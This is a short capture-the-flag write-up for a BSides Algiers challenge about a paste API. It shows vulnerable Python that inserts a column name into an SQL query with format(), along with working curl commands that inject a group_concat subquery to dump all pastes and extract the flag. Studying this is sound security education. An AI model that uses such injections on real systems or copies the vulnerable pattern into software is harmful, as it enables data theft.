# Trashbin

**`Author:`** [hfz](https://hfz1337.github.io)

## Description

GUI's are a lie, they're just front-ends to the shell.  
I made a simple API for non-GUI users to share their pastes.  
easy usage, much privacy... security?? iii have no idea.

## Write-up (brief)

A not so classic SQL injection that a lot of people missed (even SQLmap).  
The injection point is in the paste `attribute`, so it will look something like this:
```
curl -X GET http://chall.bsidesalgiers.com:8001/paste/{paste_id}/{payload}
```
Doing this black box might not be so obvious at first sight, let's take a look at the relevant part of the source code to understand what was going on:
```python
result = self.execute_query(
    "SELECT {} FROM pastes WHERE id=?".format(field), (paste_id,)
)
```
Now you're probably noticing how easy this is. Although the developer used prepared queries, he chose to make the column name dynamic, and construct the query using untrusted data.  
We can leak all the pastes using `group_concat`, then filter them out to get the flag.
```
# Create a new paste and get its ID (we need a valid paste, otherwise it would return: "no such paste"
paste_id=$(curl -sX POST -H "Content-type: application/json" -d '{"title": "test", "text": "test"}' http://chall.bsidesalgiers.com:8001/paste/new | jq .url | tr -d '"' | cut -d'/' -f3)
# Leak the flag
curl -sX GET "http://chall.bsidesalgiers.com:8001/paste/${paste_id}/(select%20group_concat(text)%20from%20pastes)" | grep -o 'shellmates{[^}]\+}'
```

Flag: `shellmates{2021_y3t_sQl_1nj3ct10ns_4r3_st1ll_4_pr0bl3m}`
